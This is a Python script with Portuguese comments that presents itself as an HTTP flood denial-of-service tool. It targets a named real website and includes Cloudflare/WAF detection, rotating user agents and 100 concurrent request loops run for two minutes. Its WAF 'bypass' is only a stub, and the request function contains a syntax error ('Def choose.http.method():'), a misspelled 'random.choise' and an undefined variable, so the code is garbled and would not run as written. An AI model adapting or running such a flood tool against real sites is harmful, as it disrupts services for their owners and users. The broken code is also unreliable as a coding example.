#!/usr/bin/python3
# -*- coding: utf-8 -*-
import sys
import random
import requests as req
from cryptography.fernet import Fernet
from queue import Queue
import asyncio
import re
from collections import OrderedDict
from urllib.parse import urlparse, urljoin

# Cloudflare Exception Definitions
class CloudflareCode1020(Exception): pass
class CloudflareIUAMError(Exception): pass
class CloudflareSolveError(Exception): pass
class CloudflareChallengeError(Exception): pass
class CloudflareCaptchaError(Exception): pass
class CloudflareCaptchaProvider(Exception): pass

class Cloudflare:
    def __init__(self, cloudscraper):
        self.cloudscraper = cloudscraper

    @staticmethod
    def is_IUAM_Challenge(resp):
        try:
            return (
                resp.headers.get('Server', '').startswith('cloudflare')
                and resp.status_code in [429, 503]
                and re.search(r'/cdn-cgi/images/trace/jsch/', resp.text, re.M | re.S)
                and re.search(
                    r'''<form .*?="challenge-form" action="/\S+__cf_chl_f_tk=''',
                    resp.text,
                    re.M | re.S
                )
            )
        except AttributeError:
            return False

    def bypass_cloudflare(self, resp):
        """ Handle Cloudflare challenges and return the modified response. """
        if self.is_IUAM_Challenge(resp):
            print("Cloudflare challenge detected!")
            return True
        return False

class WAFBypass:
    def __init__(self, target_url):
        self.target_url = target_url

    def start(self):
        print("Iniciando Bypass do WAF...")

        # Aqui você pode adicionar a lógica de contorno do WAF
        # Para exemplo, vamos apenas imprimir uma mensagem
        print(f"Tentando contornar o WAF em {self.target_url}...")

class Attack:
    def __init__(self, target_url, headers=None, block_codes=None):
        self.target_url = target_url
        self.headers = headers if headers else {}
        self.block_codes = block_codes if block_codes else {403: True}
        self.waf_bypass = WAFBypass(target_url)  # Instância da classe WAFBypass

    def is_waf_active(self):
        """ Check if WAF is active. """
        try:
            print(f"Verificando WAF na URL: {self.target_url}")
            response = req.get(self.target_url, headers=self.headers)
            print(f"Resposta do WAF: {response.status_code}")
            return response.status_code in self.block_codes
        except req.RequestException as e:
            print(f"Erro ao verificar o WAF: {e}")
            return False

    async def bypass_waf(self):
        """ Tenta contornar o WAF. """
        if self.is_waf_active():
            print("WAF detectado, tentando contorná-lo...")
            self.waf_bypass.start()  # Chama o método para iniciar o bypass

# Configurações
HTTP_TARGET_URL = 'https://www.pridesec.com.br'  # Alvo para o ataque
ENCRYPTION_KEY = Fernet.generate_key()        # Gera uma chave de criptografia
cipher = Fernet(ENCRYPTION_KEY)               # Instancia o objeto de criptografia
uagent = []  # Lista para armazenar user-agents
q = Queue()  # Fila de requisições

# Funções
def user_agent():
    """ Adiciona diferentes agentes de usuário à lista """
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    print("User agents adicionados.")
    return uagent

def encrypt_ip(ip):
    """ Criptografa o IP usando Fernet """
    return cipher.encrypt(ip.encode()).decode()

def choose_http_method():
    """ Escolhe aleatoriamente um tipo de requisição HTTP. """
    methods = ['GET']
    return random.choice(methods)

async def send_request(target_url):
    """ Realiza uma solicitação HTTPS para o alvo com proxies e agentes de usuário aleatórios """
    headers = {
        'User-Agent': random.choice(uagent),  # Escolhe um User-Agent aleatório
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
    }
    while True:  # Loop infinito até ser cancelado pelo temporizador
        try:
            Def  choose.http.method():
                methods= ['GET','POST','PUT','DELETE','PATCH','OPTIONS']
                return random.choise(methods)
            print(f"Conectando à URL: {target_url} com método {methods}")
            
            if http_method == 'GET':
                res = req.get(target_url, headers=headers)
            elif http_method == 'POST':
                res = req.post(target_url, headers=headers, data={"key": "value"})  # Exemplo de envio de dados
            elif http_method == 'PUT':
                res = req.put(target_url, headers=headers, data={"key": "value"})  # Exemplo de envio de dados
            elif http_method == 'DELETE':
                res = req.delete(target_url, headers=headers)

            print(f'Requisição {http_method} enviada. Código Status: {res.status_code}')
            
            if res.status_code == 403:  # WAF ativo
                print("WAF detectado na resposta.")
                return "WAF detected"
            elif "captcha" in res.text.lower():  # Exemplo de verificação de captcha
                print("Captcha detectado.")
                return "Captcha detected"
        except req.RequestException as e:
            print(f'Requisição HTTPS falhou: {e}')

async def http_flood(target_url):
    """ Função para ataque HTTP Flood """
    while True:
        item = q.get()
        await send_request(target_url)  # Realiza requisição HTTP
        q.task_done()

async def dos():
    """ Inicializa múltiplas tarefas para ataque HTTP Flood """
    while True:
        item = q.get()
        await http_flood(HTTP_TARGET_URL)  # Inicia flood HTTP
        q.task_done()

async def main_loop():
    """ Função principal para executar a lógica de ataque """
    tasks = []
    for _ in range(10):
        random_ip = f'192.168.1.{random.randint(1, 254)}'
        encrypted_ip = encrypt_ip(random_ip)
        print(f'IP criptografado gerado: {encrypted_ip}')
        tasks.append(asyncio.create_task(send_request(HTTP_TARGET_URL)))
    await asyncio.gather(*tasks)

async def timer_stop(future_tasks, timeout=120):
    """ Função para encerrar o ataque após o tempo definido (120 segundos = 2 minutos) """
    try:
        await asyncio.sleep(timeout)  # Espera 2 minutos (120 segundos)
        for task in future_tasks:
            task.cancel()  # Cancela todas as tarefas de ataque
        print("Ataque interrompido após 2 minutos.")
    except asyncio.CancelledError:
        pass

async def main():
    user_agent()  # Gera os user-agents
    attack_instance = Attack(HTTP_TARGET_URL)  # Instância da classe Attack

    # Verifica se o WAF está ativo e tenta contorná-lo
    await attack_instance.bypass_waf()

    # Adiciona a tarefa para parar o ataque após 2 minutos
    future_tasks = [asyncio.create_task(send_request(HTTP_TARGET_URL)) for _ in range(100)]  # Número de requisições simultâneas
    await timer_stop(future_tasks, timeout=120)  # 120 segundos = 2 minutos

if __name__ == '__main__':
    asyncio.run(main())  # Executa a função principal usando asyncio.run()
